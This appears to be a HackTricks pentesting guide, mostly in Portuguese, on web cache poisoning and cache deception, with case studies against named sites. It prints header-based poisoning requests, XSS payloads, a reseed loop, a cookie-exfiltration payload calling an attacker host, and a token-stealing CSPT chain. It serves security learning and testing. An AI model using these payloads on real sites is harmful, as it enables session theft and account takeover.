# Cache Poisoning and Cache Deception

{{#include ../../banners/hacktricks-training.md}}

## The difference

> **What is the difference between web cache poisoning and web cache deception?**
>
> - In **web cache poisoning**, the attacker causes the application to store some malicious content in the cache, and this content is served from the cache to other application users.
> - In **web cache deception**, the attacker causes the application to store some sensitive content belonging to another user in the cache, and the attacker then retrieves this content from the cache.

## Cache Poisoning

Cache poisoning tem como objetivo manipular o cache do lado do cliente para forçar clientes a carregarem recursos inesperados, parciais ou sob controle de um atacante. A extensão do impacto depende da popularidade da página afetada, já que a resposta contaminada é servida exclusivamente aos usuários que visitarem a página durante o período de contaminação do cache.

A execução de um ataque de cache poisoning envolve vários passos:

1. **Identification of Unkeyed Inputs**: São parâmetros que, embora não sejam necessários para que uma request seja cacheada, podem alterar a response retornada pelo servidor. Identificar esses inputs é crucial, pois eles podem ser explorados para manipular o cache.
2. **Exploitation of the Unkeyed Inputs**: Após identificar os Unkeyed Inputs, o próximo passo é descobrir como abusar desses parâmetros para modificar a resposta do servidor de maneira a beneficiar o atacante.
3. **Ensuring the Poisoned Response is Cached**: O passo final é garantir que a resposta manipulada seja armazenada no cache. Dessa forma, qualquer usuário acessando a página afetada enquanto o cache estiver envenenado receberá a resposta contaminada.

### Discovery: Check HTTP headers

Normalmente, quando uma response foi **stored in the cache** haverá um **header indicando isso**; você pode verificar quais headers deve prestar atenção neste post: [**HTTP Cache headers**](../../network-services-pentesting/pentesting-web/special-http-headers.md#cache-headers).

### Discovery: Caching error codes

Se você suspeita que a response está sendo armazenada em um cache, pode tentar **enviar requests com um header malformado**, que deveria ser respondido com um **status code 400**. Em seguida tente acessar a requisição normalmente e se a **response for um 400 status code**, você sabe que está vulnerável (e você poderia até mesmo realizar um DoS).

Você pode encontrar mais opções em:


{{#ref}}
cache-poisoning-to-dos.md
{{#endref}}

No entanto, note que **às vezes esse tipo de status codes não é cacheado**, então esse teste pode não ser confiável.

### Discovery: Identify and evaluate unkeyed inputs

Você pode usar [**Param Miner**](https://portswigger.net/bappstore/17d2949a985c4b7ca092728dba871943) para **forçar parâmetros e headers** que podem estar **alterando a resposta da página**. Por exemplo, uma página pode estar usando o header `X-Forwarded-For` para indicar ao cliente carregar o script a partir dali:
```html
<script type="text/javascript" src="//<X-Forwarded-For_value>/resources/js/tracking.js"></script>
```
### Elicit a harmful response from the back-end server

Com o parâmetro/header identificado, verifique como ele está sendo **sanitised** e **onde** ele está **sendo refletido** ou afetando a resposta vinda do header. Dá para abusar disso de alguma forma (executar um XSS ou carregar um JS controlado por você? executar um DoS?...)

### Get the response cached

Uma vez que você tenha **identificado** a **página** que pode ser abusada, qual **parâmetro**/**header** usar e **como** abusar dele, você precisa fazer a página ser armazenada em cache. Dependendo do recurso que você está tentando colocar no cache, isso pode levar algum tempo; talvez seja necessário tentar por vários segundos.

O header **`X-Cache`** na resposta pode ser muito útil, já que pode ter o valor **`miss`** quando a requisição não foi cacheada e o valor **`hit`** quando está cacheada.\
O header **`Cache-Control`** também é interessante para saber se um recurso está sendo cacheado e quando será a próxima vez que o recurso será cacheado novamente: `Cache-Control: public, max-age=1800`

Outro header interessante é **`Vary`**. Esse header é frequentemente usado para **indicar headers adicionais** que são tratados como **parte da chave do cache** mesmo que normalmente não sejam keyeds. Portanto, se o atacante souber o `User-Agent` da vítima que está sendo alvo, ele pode envenenar o cache para os usuários que usam aquele `User-Agent` específico.

Mais um header relacionado ao cache é **`Age`**. Ele define o tempo em segundos que o objeto está no proxy cache.

Ao cachear uma requisição, tenha **cuidado com os headers que usa** porque alguns deles podem ser **utilizados inesperadamente** como **chaves** e a **vítima precisará usar esse mesmo header**. Sempre **teste** um Cache Poisoning com **diferentes navegadores** para checar se está funcionando.

### Foundational cache poisoning case studies

#### HackerOne global redirect via `X-Forwarded-Host`

- O servidor de origem gerava redirecionamentos e URLs canônicas usando `X-Forwarded-Host`, mas a chave do cache usava apenas o cabeçalho `Host`, então uma única resposta envenenou todos os visitantes de `/`.
- Poison with:
```http
GET / HTTP/1.1
Host: hackerone.com
X-Forwarded-Host: evil.com
```
- Refaça imediatamente a requisição para `/` sem o spoofed header; se o redirect persistir, você tem uma primitive global de host-spoofing que frequentemente transforma reflected redirects/Open Graph links em stored issues.

#### DoS em repositório GitHub via `Content-Type` + `PURGE`

- O tráfego anônimo era indexado apenas pelo path, enquanto o backend entrava em estado de erro ao ver um `Content-Type` inesperado. Essa resposta de erro era cacheável para todo usuário não autenticado de um repo.
- O GitHub também (acidentalmente) honrou o verbo `PURGE`, permitindo ao atacante invalidar uma entrada saudável e forçar os caches a buscar a variante envenenada sob demanda:
```bash
curl -H "Content-Type: invalid-value" https://github.com/user/repo
curl -X PURGE https://github.com/user/repo
```
- Sempre compare authenticated vs anonymous cache keys, fuzz headers raramente usados como `Content-Type`, e probe por exposed cache-maintenance verbs para automatizar re-poisoning.

#### Shopify cross-host persistence loops

- Multi-layer caches às vezes requerem múltiplos hits idênticos antes de confirmar um novo objeto. Shopify reutilizou o mesmo cache em numerosos localized hosts, então a persistence significava impacto em muitas properties.
- Use short automation loops para reseed repetidamente:
```python
import requests, time
for i in range(100):
requests.get("https://shop.shopify.com/endpoint",
headers={"X-Forwarded-Host": "attacker.com"})
time.sleep(0.1)
print("attacker.com" in requests.get("https://shop.shopify.com/endpoint").text)
```
- Após uma resposta `hit`, rastreie outros hosts/assets que compartilham o mesmo namespace de cache para demonstrar o raio de impacto entre domínios.

#### Redirecionamento de asset JS → stored XSS chain

- Programas privados frequentemente hospedam JS compartilhado como `/assets/main.js` em dezenas de subdomínios. Se `X-Forwarded-Host` influencia a lógica de redirecionamento para esses assets mas não for usado como chave, a resposta em cache se torna um 301 para o JS do atacante, produzindo stored XSS em todos os lugares onde o asset é importado.
```http
GET /assets/main.js HTTP/1.1
Host: target.com
X-Forwarded-Host: attacker.com
```
- Mapeie quais hosts reutilizam o mesmo caminho de asset para que você possa comprovar comprometimento em múltiplos subdomínios.

#### DoS estático no GitLab via `X-HTTP-Method-Override`

- O GitLab servia bundles estáticos do Google Cloud Storage, que respeita `X-HTTP-Method-Override`. Sobrescrever GET para HEAD retornava um `200 OK` cacheável com `Content-Length: 0`, e o cache de borda ignorava o método HTTP ao gerar a chave.
```http
GET /static/app.js HTTP/1.1
Host: gitlab.com
X-HTTP-Method-Override: HEAD
```
- Uma única solicitação substituiu o JS bundle por um corpo vazio para todo GET, efetivamente DoSing a UI. Sempre teste sobrescritas de método (`X-HTTP-Method-Override`, `X-Method-Override`, etc.) contra ativos estáticos e confirme se o cache varia conforme o método.

#### HackerOne loop de ativos estáticos via `X-Forwarded-Scheme`

- Rails’ Rack middleware confiava em `X-Forwarded-Scheme` para decidir se aplicava HTTPS. Falsificar `http` em `/static/logo.png` disparou um 301 cacheável, então todos os usuários passaram a receber redirecionamentos (ou loops) em vez do ativo:
```http
GET /static/logo.png HTTP/1.1
Host: hackerone.com
X-Forwarded-Scheme: http
```
- Combine scheme spoofing com host spoofing quando possível para criar redirecionamentos irreversíveis para recursos de alta visibilidade.

#### Cloudflare host-header casing mismatch

- Cloudflare normalizou o `Host` header para cache keys mas encaminhou o casing bruto para origins. Enviar `Host: TaRgEt.CoM` acionou comportamento alternativo em origin routing/templating enquanto ainda populava o canonical lowercase cache bucket.
```http
GET / HTTP/1.1
Host: TaRgEt.CoM
```
- Enumere os tenants do CDN reexecutando hosts com maiúsculas/minúsculas misturadas (e outros cabeçalhos normalizados) e compare (diff) a resposta em cache com a resposta de origem para descobrir shared-platform cache poisonings.

#### Red Hat Open Graph meta poisoning

- A injeção de `X-Forwarded-Host` dentro de tags Open Graph transformou uma reflected HTML injection em uma stored XSS quando o CDN armazenou a página em cache. Use um harmless cache buster durante os testes para evitar prejudicar usuários em produção:
```http
GET /en?dontpoisoneveryone=1 HTTP/1.1
Host: www.redhat.com
X-Forwarded-Host: a."?><script>alert(1)</script>
```
- Scrapers de redes sociais consomem tags Open Graph em cache, então uma única entrada envenenada distribui o payload muito além dos visitantes diretos.

## Exemplos de Exploração

### Exemplo mais simples

Um cabeçalho como `X-Forwarded-For` está sendo refletido na resposta sem sanitização.\
Você pode enviar um payload XSS básico e envenenar o cache para que todo mundo que acessar a página seja XSSed:
```html
GET /en?region=uk HTTP/1.1
Host: innocent-website.com
X-Forwarded-Host: a."><script>alert(1)</script>"
```
_Note that this will poison a request to `/en?region=uk` not to `/en`_

### Cache poisoning to DoS


{{#ref}}
cache-poisoning-to-dos.md
{{#endref}}

### Cache poisoning through CDNs

Em **[this writeup](https://nokline.github.io/bugbounty/2024/02/04/ChatGPT-ATO.html)** é explicado o seguinte cenário simples:

- O CDN armazenará em cache qualquer coisa sob `/share/`
- O CDN NÃO irá decodificar nem normalizar `%2F..%2F`, portanto pode ser usado como **path traversal to access other sensitive locations that will be cached** como `https://chat.openai.com/share/%2F..%2Fapi/auth/session?cachebuster=123`
- O servidor web IRÁ decodificar e normalizar `%2F..%2F`, e responderá com `/api/auth/session`, que **contém o token de autenticação**.

### Using web cache poisoning to exploit cookie-handling vulnerabilities

Cookies também podem ser refletidos na resposta de uma página. Se você conseguir abusar disso para causar um XSS, por exemplo, você poderia explorar XSS em vários clientes que carreguem a resposta de cache maliciosa.
```html
GET / HTTP/1.1
Host: vulnerable.com
Cookie: session=VftzO7ZtiBj5zNLRAuFpXpSQLjS4lBmU; fehost=asd"%2balert(1)%2b"
```
Observe que, se o cookie vulnerável for muito usado pelos usuários, requisições regulares irão limpar o cache.

### Gerando discrepâncias com delimitadores, normalização e pontos <a href="#using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities" id="using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities"></a>

Confira:


{{#ref}}
cache-poisoning-via-url-discrepancies.md
{{#endref}}

### Cache poisoning com path traversal para roubar API key <a href="#using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities" id="using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities"></a>

[**This writeup explains**](https://nokline.github.io/bugbounty/2024/02/04/ChatGPT-ATO.html) how it was possible to steal an OpenAI API key with an URL like `https://chat.openai.com/share/%2F..%2Fapi/auth/session?cachebuster=123` because anything matching `/share/*` will be cached without Cloudflare normalising the URL, which was done when the request reached the web server.

This is also explained better in:


{{#ref}}
cache-poisoning-via-url-discrepancies.md
{{#endref}}

### Using multiple headers to exploit web cache poisoning vulnerabilities <a href="#using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities" id="using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities"></a>

Às vezes você precisará **explorar várias entradas não chaveadas** para poder abusar de um cache. Por exemplo, você pode encontrar um **Open redirect** se definir `X-Forwarded-Host` para um domínio controlado por você e `X-Forwarded-Scheme` para `http`. **Se** o **servidor** estiver **redirecionando** todas as requisições **HTTP** **para HTTPS** e usando o header `X-Forwarded-Scheme` como o nome de domínio para o redirect. Você pode controlar para onde a página é apontada pelo redirect.
```html
GET /resources/js/tracking.js HTTP/1.1
Host: acc11fe01f16f89c80556c2b0056002e.web-security-academy.net
X-Forwarded-Host: ac8e1f8f1fb1f8cb80586c1d01d500d3.web-security-academy.net/
X-Forwarded-Scheme: http
```
### Explorando com `Vary`header limitado

Se você descobriu que o **`X-Host`** header está sendo usado como **nome de domínio para carregar um recurso JS**, mas o **`Vary`** header na resposta está indicando **`User-Agent`**, então você precisa encontrar uma forma de exfiltrar o User-Agent da vítima e envenenar o cache usando esse User-Agent:
```html
GET / HTTP/1.1
Host: vulnerbale.net
User-Agent: THE SPECIAL USER-AGENT OF THE VICTIM
X-Host: attacker.com
```
### Fat Get

Envie um GET request com o request na URL e no body. Se o web server usar o que está no body, mas o cache server cachear o que está na URL, qualquer pessoa que acessar essa URL na verdade usará o parameter do body. Como a vuln que James Kettle encontrou no Github website:
```
GET /contact/report-abuse?report=albinowax HTTP/1.1
Host: github.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 22

report=innocent-victim
```
Há um lab do PortSwigger sobre isso: [https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-fat-get](https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-fat-get)

### Parameter Cloacking

Por exemplo, é possível separar **parameters** em servidores ruby usando o caractere **`;`** em vez de **`&`**. Isso pode ser usado para colocar valores de unkeyed parameters dentro de keyed ones e abusar deles.

Portswigger lab: [https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-param-cloaking](https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-param-cloaking)

### Exploiting HTTP Cache Poisoning by abusing HTTP Request Smuggling

Aprenda aqui como realizar [Cache Poisoning attacks by abusing HTTP Request Smuggling](../http-request-smuggling/index.html#using-http-request-smuggling-to-perform-web-cache-poisoning).

### Automated testing for Web Cache Poisoning

O [Web Cache Vulnerability Scanner](https://github.com/Hackmanit/Web-Cache-Vulnerability-Scanner) pode ser usado para testar automaticamente Web Cache Poisoning. Ele suporta muitas técnicas diferentes e é altamente customizável.

Example usage: `wcvs -u example.com`

### Header-reflection XSS + CDN/WAF-assisted cache seeding (User-Agent, auto-cached .js)

Esse padrão do mundo real encadeia um header-based reflection primitive com o comportamento do CDN/WAF para envenenar de forma confiável o HTML em cache servido a outros usuários:

- O HTML principal refletia um request header não confiável (e.g., `User-Agent`) em contexto executável.
- O CDN removia headers de cache, mas existia um cache internal/origin. O CDN também auto-cacheava requests terminando em extensões estáticas (e.g., `.js`), enquanto o WAF aplicava uma inspeção de conteúdo mais fraca para GETs de static assets.
- Quirks no fluxo de requests permitiam que uma requisição para um caminho `.js` influenciasse a cache key/variant usada pelo HTML principal subsequente, permitindo XSS cross-user via header reflection.

Receita prática (observada em um CDN/WAF popular):

1) A partir de um IP limpo (evite downgrades baseados em reputação anteriores), defina um `User-Agent` malicioso via browser ou Burp Proxy Match & Replace.  
2) No Burp Repeater, prepare um grupo de duas requests e use "Send group in parallel" (single-packet mode funciona melhor):
- First request: GET a `.js` resource path on the same origin while sending your malicious `User-Agent`.  
- Immediately after: GET the main page (`/`).  
3) A corrida de roteamento do CDN/WAF mais o `.js` auto-cacheado frequentemente semeia uma variante de HTML em cache envenenada que então é servida a outros visitantes que compartilham as mesmas condições da cache key (e.g., mesmas dimensões `Vary` como `User-Agent`).

Exemplo de payload de header (para exfiltrar non-HttpOnly cookies):
```http
User-Agent: Mo00ozilla/5.0</script><script>new Image().src='https://attacker.oastify.com?a='+document.cookie</script>"
```
Dicas operacionais:

- Muitos CDNs ocultam cache headers; poisoning pode aparecer apenas em ciclos de atualização de várias horas. Use múltiplos IPs de diferentes pontos de observação e regule a taxa para evitar gatilhos de rate-limit ou de reputação.
- Usar um IP da própria cloud do CDN às vezes melhora a consistência do roteamento.
- Se um CSP estrito estiver presente, isso ainda funciona se a reflection for executada no contexto principal do HTML e o CSP permitir execução inline ou for contornado pelo contexto.

Impacto:

- Se os cookies de sessão não forem `HttpOnly`, ATO zero-click é possível ao exfiltrar em massa `document.cookie` de todos os usuários que recebem o poisoned HTML.


### Sitecore pre‑auth HTML cache poisoning (unsafe XAML Ajax reflection)

A Sitecore‑specific pattern enables unauthenticated writes to the HtmlCache by abusing pre‑auth XAML handlers and AjaxScriptManager reflection. When the `Sitecore.Shell.Xaml.WebControl` handler is reached, an `xmlcontrol:GlobalHeader` (derived from `Sitecore.Web.UI.WebControl`) is available and the following reflective call is allowed:
```http
POST /-/xaml/Sitecore.Shell.Xaml.WebControl
Content-Type: application/x-www-form-urlencoded

__PARAMETERS=AddToCache("key","<html>…payload…</html>")&__SOURCE=ctl00_ctl00_ctl05_ctl03&__ISEVENT=1
```
Isso escreve HTML arbitrário sob uma cache key escolhida pelo attacker, permitindo cache poisoning preciso assim que os cache keys forem conhecidos.

Para detalhes completos (construção do cache key, ItemService enumeration e uma RCE por desserialização encadeada pós-auth):

{{#ref}}
../../network-services-pentesting/pentesting-web/sitecore/README.md
{{#endref}}

## Exemplos Vulneráveis

### Apache Traffic Server ([CVE-2021-27577](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-27577))

ATS encaminhava o fragmento dentro da URL sem removê-lo e gerava o cache key usando apenas host, path e query (ignorando o fragmento). Assim a requisição `/#/../?r=javascript:alert(1)` foi enviada ao backend como `/#/../?r=javascript:alert(1)` e o cache key não continha o payload, somente host, path e query.

### 403 and Storage Buckets

Cloudflare anteriormente cacheava respostas 403. Tentar acessar S3 ou Azure Storage Blobs com headers Authorization incorretos resultava em uma resposta 403 que era cacheada. Embora Cloudflare tenha parado de cachear respostas 403, esse comportamento pode ainda estar presente em outros serviços de proxy.

### Injetando Parâmetros Chaveados

Caches frequentemente incluem parâmetros GET específicos no cache key. Por exemplo, o Varnish da Fastly cacheava o parâmetro `size` nas requisições. Entretanto, se uma versão URL-encoded do parâmetro (por exemplo, `siz%65`) também fosse enviada com um valor errado, o cache key seria construído usando o parâmetro `size` correto. Ainda assim, o backend processaria o valor no parâmetro URL-encoded. URL-encoding do segundo parâmetro `size` levava à sua omissão pelo cache mas à sua utilização pelo backend. Atribuir o valor 0 a esse parâmetro resultava em um erro 400 Bad Request cacheável.

### Regras de User Agent

Alguns desenvolvedores bloqueiam requisições com user-agents que correspondem aos de ferramentas de alto tráfego como FFUF ou Nuclei para gerenciar a carga do servidor. Ironicamente, essa abordagem pode introduzir vulnerabilidades como cache poisoning e DoS.

### Campos de Header Ilegais

O [RFC7230](https://datatracker.ietf.mrg/doc/html/rfc7230) especifica os caracteres aceitáveis em nomes de header. Headers contendo caracteres fora do intervalo **tchar** especificado deveriam idealmente disparar uma resposta 400 Bad Request. Na prática, servidores nem sempre seguem esse padrão. Um exemplo notável é Akamai, que encaminha headers com caracteres inválidos e cacheia qualquer erro 400, contanto que o header `cache-control` não esteja presente. Foi identificado um padrão explorável onde o envio de um header com um caractere ilegal, como `\`, resultava em um 400 Bad Request cacheável.

### Encontrando novos headers

[https://gist.github.com/iustin24/92a5ba76ee436c85716f003dda8eecc6](https://gist.github.com/iustin24/92a5ba76ee436c85716f003dda8eecc6)

## Cache Deception

O objetivo do Cache Deception é fazer com que clients carreguem recursos que vão ser salvos pelo cache com suas informações sensíveis.

Antes de tudo, note que extensões como `.css`, `.js`, `.png` etc. geralmente estão configuradas para serem salvas no cache. Portanto, se você acessar `www.example.com/profile.php/nonexistent.js` o cache provavelmente armazenará a resposta porque detecta a extensão `.js`. Mas, se a aplicação estiver respondendo com os conteúdos sensíveis do usuário armazenados em _www.example.com/profile.php_, você pode roubar esses conteúdos de outros usuários.

Outras coisas para testar:

- _www.example.com/profile.php/.js_
- _www.example.com/profile.php/.css_
- _www.example.com/profile.php/test.js_
- _www.example.com/profile.php/../test.js_
- _www.example.com/profile.php/%2e%2e/test.js_
- _Use lesser known extensions such as_ `.avif`

Another very clear example can be found in this write-up: [https://hackerone.com/reports/593712](https://hackerone.com/reports/593712).\
No exemplo, é explicado que se você carregar uma página inexistente como _http://www.example.com/home.php/non-existent.css_ o conteúdo de _http://www.example.com/home.php_ (**com as informações sensíveis do usuário**) será retornado e o cache server irá salvar o resultado.\
Então, o **attacker** pode acessar _http://www.example.com/home.php/non-existent.css_ no próprio navegador e observar as **informações confidenciais** dos usuários que acessaram antes.

Note que o cache proxy deve estar configurado para cachear arquivos com base na extensão do arquivo (_.css_) e não com base no content-type. No exemplo _http://www.example.com/home.php/non-existent.css_ terá um content-type `text/html` em vez de um mime type `text/css`.

Learn here about how to perform[ Cache Deceptions attacks abusing HTTP Request Smuggling](../http-request-smuggling/index.html#using-http-request-smuggling-to-perform-web-cache-deception).

### CSPT-assisted authenticated cache poisoning (Account Takeover)

This pattern combines a Client-Side Path Traversal (CSPT) primitive in a Single-Page App (SPA) with extension-based CDN caching to publicly cache sensitive JSON that was originally only available via an authenticated API call.

High level idea:

- A sensitive API endpoint requires a custom auth header and is correctly marked as non-cacheable by origin.
- Appending a static-looking suffix (for example, .css) makes the CDN treat the path as a static asset and cache the response, often without varying on sensitive headers.
- The SPA contains CSPT: it concatenates a user-controlled path segment into the API URL while attaching the victim’s auth header (for example, X-Auth-Token). By injecting ../.. traversal, the authenticated fetch is redirected to the cacheable path variant (…/v1/token.css), causing the CDN to cache the victim’s token JSON under a public key.
- Anyone can then GET that same cache key without authentication and retrieve the victim’s token.

Example

- Sensitive endpoint (non-cacheable at origin):
```
GET /v1/token HTTP/1.1
Host: api.example.com
X-Auth-Token: <REDACTED>
Accept: application/json

HTTP/1.1 200 OK
Content-Type: application/json
Cache-Control: no-cache, no-store, must-revalidate
X-Cache: Miss from cdn

{"token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."}
```
- Sufixo com aparência estática faz a CDN tornar cacheável:
```
GET /v1/token.css HTTP/1.1
Host: api.example.com
X-Auth-Token: <REDACTED>
Accept: application/json

HTTP/1.1 200 OK
Content-Type: application/json
Cache-Control: max-age=86400, public
X-Cache: Hit from cdn

{"token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."}
```
- CSPT em SPA anexa auth header e permite traversal:
```js
const urlParams = new URLSearchParams(window.location.search);
const userId = urlParams.get('userId');

const apiUrl = `https://api.example.com/v1/users/info/${userId}`;

fetch(apiUrl, {
method: 'GET',
headers: { 'X-Auth-Token': authToken }
});
```
- Exploit chain:
1. Atrair a vítima para uma URL que injeta dot-segments no parâmetro de path da SPA, por exemplo:
- [https://example.com/user?userId=../../../v1/token.css](https://example.com/user?userId=../../../v1/token.css)
2. A SPA faz um fetch autenticado para:
- [https://api.example.com/v1/users/info/../../../v1/token.css](https://api.example.com/v1/users/info/../../../v1/token.css)
3. A normalização do navegador resolve para:
- [https://api.example.com/v1/token.css](https://api.example.com/v1/token.css)
4. O CDN trata .css como um asset estático e cacheia o JSON com Cache-Control: public, max-age=...
5. Recuperação pública: qualquer pessoa pode então fazer GET https://api.example.com/v1/token.css e obter o JSON de token em cache.

Preconditions

- SPA realiza fetch/XHR autenticado para a mesma origem do API (ou cross-origin com CORS funcionando) e anexa headers sensíveis ou bearer tokens.
- Edge/CDN aplica caching baseado em extensão para caminhos com aparência estática (por exemplo, *.css, *.js, images) e não varia a chave do cache com base no header sensível.
- A origem do endpoint base não é cacheável (correto), mas a variante com sufixo de extensão é permitida ou não é bloqueada pelas regras do edge.

Validation checklist

- Identificar endpoints dinâmicos sensíveis e testar sufixos como .css, .js, .jpg, .json. Procurar por Cache-Control: public/max-age e X-Cache: Hit (ou equivalente, e.g., CF-Cache-Status) enquanto o conteúdo permanece JSON.
- Localizar código cliente que concatena input controlado pelo usuário em API paths enquanto anexa headers de auth. Injete sequências ../ para redirecionar a requisição autenticada para o endpoint alvo.
- Confirmar que o header autenticado está presente na requisição redirecionada (por exemplo, em um proxy ou via logs do servidor) e que o CDN cacheia a resposta sob o path atravessado.
- A partir de um contexto limpo (sem auth), solicite o mesmo path e confirme que o JSON secreto é servido do cache.

## Ferramentas Automáticas

- [**toxicache**](https://github.com/xhzeem/toxicache): Golang scanner para encontrar web cache poisoning vulnerabilities em uma lista de URLs e testar múltiplas injection techniques.

## Referências

- [https://portswigger.net/web-security/web-cache-poisoning](https://portswigger.net/web-security/web-cache-poisoning)
- [https://portswigger.net/web-security/web-cache-poisoning/exploiting#using-web-cache-poisoning-to-exploit-cookie-handling-vulnerabilities](https://portswigger.net/web-security/web-cache-poisoning/exploiting#using-web-cache-poisoning-to-exploit-cookie-handling-vulnerabilities)
- [https://hackerone.com/reports/593712](https://hackerone.com/reports/593712)
- [https://youst.in/posts/cache-poisoning-at-scale/](https://youst.in/posts/cache-poisoning-at-scale/)
- [https://bxmbn.medium.com/how-i-test-for-web-cache-vulnerabilities-tips-and-tricks-9b138da08ff9](https://bxmbn.medium.com/how-i-test-for-web-cache-vulnerabilities-tips-and-tricks-9b138da08ff9)
- [https://www.linkedin.com/pulse/how-i-hacked-all-zendesk-sites-265000-site-one-line-abdalhfaz/](https://www.linkedin.com/pulse/how-i-hacked-all-zendesk-sites-265000-site-one-line-abdalhfaz/)
- [How I found a 0-Click Account takeover in a public BBP and leveraged it to access Admin-Level functionalities](https://hesar101.github.io/posts/How-I-found-a-0-Click-Account-takeover-in-a-public-BBP-and-leveraged-It-to-access-Admin-Level-functionalities/)
- [Burp Proxy Match & Replace](https://portswigger.net/burp/documentation/desktop/tools/proxy/match-and-replace)
- [watchTowr Labs – Sitecore XP cache poisoning → RCE](https://labs.watchtowr.com/cache-me-if-you-can-sitecore-experience-platform-cache-poisoning-to-rce/)
- [Cache Deception + CSPT: Turning Non Impactful Findings into Account Takeover](https://zere.es/posts/cache-deception-cspt-account-takeover/)
- [CSPT overview by Matan Berson](https://matanber.com/blog/cspt-levels/)
- [CSPT presentation by Maxence Schmitt](https://www.youtube.com/watch?v=O1ZN_OCfNzg)
- [PortSwigger: Web Cache Deception](https://portswigger.net/web-security/web-cache-deception)
- [Cache Poisoning Case Studies Part 1: Foundational Attacks Behind a $100K+ Vulnerability Class](https://herish.me/blog/cache-poisoning-case-studies-part-1-foundational-attacks/)



{{#include ../../banners/hacktricks-training.md}}
